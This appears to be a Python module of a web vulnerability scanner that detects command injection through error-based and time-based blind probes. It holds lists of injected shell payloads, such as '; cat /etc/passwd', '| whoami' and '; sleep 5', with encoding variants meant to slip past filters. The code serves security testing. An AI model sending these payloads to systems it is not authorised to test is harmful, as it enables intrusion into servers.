"""Command injection detection -- error-based + time-based blind."""
import re
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

from scanner.modules.base import BaseModule
from scanner.core.html_utils import _extract_params, _make_test_url
from scanner.core.encoding import generate_variants, TECHNIQUE_FUNCS


# ── Command Injection Techniques ─────────────────────────────────────
# SQL-specific (comment_inject) and HTML-specific (html_entity) excluded

CMDI_TECHNIQUES = [
    "url_encode", "case_mix", "whitespace_vary",
    "double_url_encode", "null_byte",
]

# ── Error-Based Payloads ────────────────────────────────────────────

CMD_ERROR_PAYLOADS = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "; whoami",
    "| whoami",
    "; cat /etc/passwd",
    "; uname -a",
    "| dir",
    "; type %SystemRoot%\\win.ini",
    "& whoami",
    "|| whoami",
]

# ── OS Command Output Patterns ──────────────────────────────────────

CMD_ERROR_PATTERNS = {
    "Unix": [
        r"uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)",
        r"root:x:0:0:",
        r"(?:www-data|nobody|daemon):x:",
        r"Linux\s+\S+\s+\d+\.\d+",
        r"Darwin\s+\S+\s+\d+\.\d+",
    ],
    "Windows": [
        r"Volume\sin\sdrive",
        r"Directory\sof\s",
        r"<DIR>\s+",
        r"nt\s+authority\\",
        r"\\\\windows\\\\",
        r"\[Version\s+\d+\.\d+",
    ],
}

# ── Time-Based Sleep Payloads ───────────────────────────────────────

CMD_SLEEP_PAYLOADS = [
    {"os": "Unix", "payload": "; sleep 5"},
    {"os": "Unix", "payload": "| sleep 5"},
    {"os": "Unix", "payload": "|| sleep 5"},
    {"os": "Unix", "payload": "&& sleep 5"},
]

DEFAULT_THRESHOLD = 5  # seconds


# ── Pure Functions (testable) ───────────────────────────────────────

def _check_cmd_error_patterns(text):
    """Scan response text for OS command output patterns.

    Returns {"os": str, "pattern": str} or None.
    """
    for os_name, patterns in CMD_ERROR_PATTERNS.items():
        for pat in patterns:
            if re.search(pat, text, re.IGNORECASE):
                return {"os": os_name, "pattern": pat}
    return None


def _build_baseline_time(url, send_request):
    """Send 3 normal requests, return average response time in seconds."""
    times = []
    for _ in range(3):
        start = time.perf_counter()
        try:
            send_request(url)
        except Exception:
            pass
        elapsed = time.perf_counter() - start
        times.append(elapsed)
    return sum(times) / len(times) if times else 0.0


# ── CmdiModule ──────────────────────────────────────────────────────

class CmdiModule(BaseModule):
    name = "cmdi"
    description = "Detect command injection via error output + time-based blind"
    requires_url = True

    def run(self, target, request_handler, output, threads=10):
        """Run error-based and time-based command injection detection."""
        target = target.rstrip("/")
        output.log_progress(f"Fetching {target} for parameter extraction...")

        try:
            resp = request_handler.get(target)
            html = resp.text
        except Exception as e:
            output.log_progress(f"Failed to fetch {target}: {e}")
            return {"module": self.name, "findings": []}

        param_names = _extract_params(target, html)

        # If URL has no obvious params, try the URL query itself
        if not param_names:
            parsed = urllib.parse.urlparse(target)
            if parsed.query:
                param_names = [
                    {"name": k, "method": "GET"}
                    for k in urllib.parse.parse_qs(parsed.query).keys()
                ]

        if not param_names:
            output.log_progress("No testable parameters found on this page")
            return {"module": self.name, "findings": []}

        param_list = [f"{p['name']}({p['method']})" for p in param_names]
        output.log_progress(
            f"Found {len(param_names)} potential parameters: {param_list}"
        )

        findings = []
        param_has_error = set()

        # Phase 1: Error-based (fast, 3 concurrent requests)
        output.log_progress(
            f"Phase 1: Error-based testing ({len(CMD_ERROR_PAYLOADS)} payloads)"
        )
        with ThreadPoolExecutor(max_workers=max(2, min(threads, 10))) as pool:
            futures = {}
            for entry in param_names:
                pname = entry["name"]
                method = entry["method"]
                for error_payload in CMD_ERROR_PAYLOADS:
                    for encoded, tech in generate_variants(
                        error_payload, CMDI_TECHNIQUES
                    ):
                        if method == "POST":
                            test_url = target
                            futures[pool.submit(
                                request_handler.post, target,
                                data={pname: encoded}
                            )] = (pname, error_payload, test_url, tech)
                        else:
                            test_url = _make_test_url(target, pname, encoded)
                            futures[pool.submit(
                                request_handler.get, test_url
                            )] = (pname, error_payload, test_url, tech)

            bar = output.create_progress_bar("Error-Based", len(futures))
            for future in as_completed(futures):
                pname, payload, test_url, tech = futures[future]
                try:
                    resp = future.result()
                    match = _check_cmd_error_patterns(resp.text)
                    if match:
                        if pname not in param_has_error:
                            param_has_error.add(pname)
                            finding = {
                                "type": "error_based",
                                "parameter": pname,
                                "url": test_url,
                                "os": match["os"],
                                "encoding": tech,
                                "evidence": (
                                    f"OS command output matching "
                                    f"'{match['pattern']}' found "
                                    f"(encoding: {tech})"
                                ),
                            }
                            findings.append(finding)
                            output.log_finding(self.name, finding)
                except Exception:
                    pass
                output.update_progress(bar)
            bar.close()

        # Determine which params need Phase 2
        time_based_targets = [
            entry for entry in param_names
            if entry["name"] not in param_has_error
        ]

        # Phase 2: Time-based blind for params without error matches
        if time_based_targets:
            output.log_progress(
                f"Phase 2: Time-based blind ({len(time_based_targets)} params, "
                f"{len(CMD_SLEEP_PAYLOADS)} payloads)"
            )
            with ThreadPoolExecutor(max_workers=max(2, min(threads, 10))) as pool:
                # Compute baseline for each parameter
                param_baselines = {}
                for entry in time_based_targets:
                    pname = entry["name"]
                    if entry["method"] == "POST":
                        baseline = _build_baseline_time(
                            target,
                            lambda u, n=pname: request_handler.post(
                                u, data={n: "1"}
                            )
                        )
                    else:
                        base_url = _make_test_url(target, pname, "1")
                        baseline = _build_baseline_time(
                            base_url, request_handler.get
                        )
                    param_baselines[pname] = baseline
                    output.log_progress(
                        f"  {pname} baseline: {baseline*1000:.0f}ms"
                    )

                # Test sleep payloads
                futures = {}
                for entry in time_based_targets:
                    pname = entry["name"]
                    for sp in CMD_SLEEP_PAYLOADS:
                        for encoded, tech in generate_variants(
                            sp["payload"], CMDI_TECHNIQUES
                        ):
                            if entry["method"] == "POST":
                                test_url = target
                                futures[pool.submit(
                                    self._timed_request,
                                    lambda u, n=pname, pl=encoded: (
                                        request_handler.post(u, data={n: pl})
                                    ),
                                    target
                                )] = (
                                    pname, sp["os"], sp["payload"], test_url,
                                    param_baselines[pname], tech,
                                )
                            else:
                                test_url = _make_test_url(
                                    target, pname, encoded
                                )
                                futures[pool.submit(
                                    self._timed_request,
                                    request_handler.get, test_url
                                )] = (
                                    pname, sp["os"], sp["payload"], test_url,
                                    param_baselines[pname], tech,
                                )

                bar = output.create_progress_bar("Time-Based", len(futures))
                for future in as_completed(futures):
                    pname, os_name, payload, test_url, baseline, tech = (
                        futures[future]
                    )
                    try:
                        elapsed = future.result()
                        threshold = max(baseline * 3, DEFAULT_THRESHOLD)
                        if elapsed is not None and elapsed > threshold:
                            finding = {
                                "type": "time_based",
                                "parameter": pname,
                                "url": test_url,
                                "os": os_name,
                                "encoding": tech,
                                "baseline_ms": round(baseline * 1000),
                                "response_ms": round(elapsed * 1000),
                                "evidence": (
                                    f"Response delayed {elapsed*1000:.0f}ms "
                                    f"vs baseline {baseline*1000:.0f}ms "
                                    f"(encoding: {tech})"
                                ),
                            }
                            findings.append(finding)
                            output.log_finding(self.name, finding)
                    except Exception:
                        pass
                    output.update_progress(bar)
                bar.close()

        output.log_progress(
            f"Command injection done: {len(findings)} potential injections found"
        )
        return {"module": self.name, "findings": findings}

    def _timed_request(self, get_func, url):
        """Make a request and return elapsed time in seconds, or None on failure."""
        start = time.perf_counter()
        try:
            get_func(url)
            return time.perf_counter() - start
        except Exception:
            return None
